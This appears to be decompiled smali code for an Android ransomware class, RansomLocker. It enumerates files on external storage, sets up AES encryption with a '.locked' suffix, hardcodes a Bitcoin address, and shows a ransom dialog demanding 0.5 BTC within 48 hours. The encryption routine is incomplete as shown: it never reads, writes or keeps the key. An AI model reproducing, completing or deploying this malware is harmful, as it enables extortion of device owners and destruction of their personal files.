.class public Lcom/malapp/RansomLocker;
.super Ljava/lang/Object;
.source "RansomLocker.java"

.field private btcAddress:Ljava/lang/String;

.method public constructor <init>()V
    .locals 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    const-string v0, "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
    iput-object v0, p0, Lcom/malapp/RansomLocker;->btcAddress:Ljava/lang/String;
    return-void
.end method

.method public encryptFile(Ljava/io/File;)V
    .locals 6
    .param p1, "target"

    # Initialize AES cipher for file encryption
    const-string v0, "AES/CBC/PKCS5Padding"
    invoke-static {v0}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;
    move-result-object v0

    # Generate encryption key
    const-string v1, "AES"
    invoke-static {v1}, Ljavax/crypto/KeyGenerator;->getInstance(Ljava/lang/String;)Ljavax/crypto/KeyGenerator;
    move-result-object v1
    const/16 v2, 0x80
    invoke-virtual {v1, v2}, Ljavax/crypto/KeyGenerator;->init(I)V
    invoke-virtual {v1}, Ljavax/crypto/KeyGenerator;->generateKey()Ljavax/crypto/SecretKey;
    move-result-object v1

    # Read victim's file
    new-instance v2, Ljava/io/FileInputStream;
    invoke-direct {v2, p1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    # Encrypt with AES
    const/4 v3, 0x1
    invoke-virtual {v0, v3, v1}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V

    # Write encrypted output with .locked extension
    new-instance v3, Ljava/lang/StringBuilder;
    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V
    invoke-virtual {p1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
    move-result-object v4
    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v4, ".locked"
    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v3

    new-instance v4, Ljava/io/FileOutputStream;
    invoke-direct {v4, v3}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;)V

    return-void
.end method

.method public encryptAllFiles()V
    .locals 4

    # Target external storage — user's personal files
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;
    move-result-object v0

    # Enumerate all files on storage
    invoke-virtual {v0}, Ljava/io/File;->listFiles()[Ljava/io/File;
    move-result-object v1

    # Encrypt each file
    array-length v2, v1
    const/4 v3, 0x0
    :loop
    if-ge v3, v2, :done
    aget-object v0, v1, v3
    invoke-virtual {p0, v0}, Lcom/malapp/RansomLocker;->encryptFile(Ljava/io/File;)V
    add-int/lit8 v3, v3, 0x1
    goto :loop
    :done
    return-void
.end method

.method public showRansomNote(Landroid/content/Context;)V
    .locals 3
    .param p1, "ctx"

    # Display ransom payment demand to victim
    new-instance v0, Landroid/app/AlertDialog$Builder;
    invoke-direct {v0, p1}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    const-string v1, "Your files have been encrypted!"
    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    new-instance v1, Ljava/lang/StringBuilder;
    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V
    const-string v2, "Send 0.5 BTC to "
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    iget-object v2, p0, Lcom/malapp/RansomLocker;->btcAddress:Ljava/lang/String;
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v2, " to decrypt your files. You have 48 hours."
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v1
    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    invoke-virtual {v0}, Landroid/app/AlertDialog$Builder;->create()Landroid/app/AlertDialog;
    move-result-object v0
    invoke-virtual {v0}, Landroid/app/AlertDialog;->show()V

    return-void
.end method
